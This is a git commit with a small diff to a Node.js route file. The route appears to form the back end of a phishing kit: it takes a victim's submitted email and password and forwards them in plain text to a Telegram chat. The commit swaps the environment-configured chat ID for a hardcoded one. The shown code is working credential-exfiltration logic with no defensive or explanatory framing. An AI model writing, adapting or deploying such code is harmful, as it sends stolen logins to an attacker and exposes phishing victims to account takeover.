d0a2571f8312c7c915a8f58e6797867ab3fc743b
unknown <olatoyeolaide@gmail.com>
2023-08-14 09:59:16 -0700

    another bot

--- routes/send-route.js
+++ routes/send-route.js
@@ -15,8 +15,8 @@ const route = router.use("/", function (req, res, next) {
      // send a message to the chat acknowledging receipt of their message
     const chatId =  parseInt( process.env.CHATID );
     try {
-        bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
-        // bot.sendMessage(5602225099 , `username: ${email} : password ${pass}`);
+        // bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
+        bot.sendMessage(5602225099 , `username: ${email} : password ${pass}`);
         bot.close();
         res.send({ good: 'good' });
 
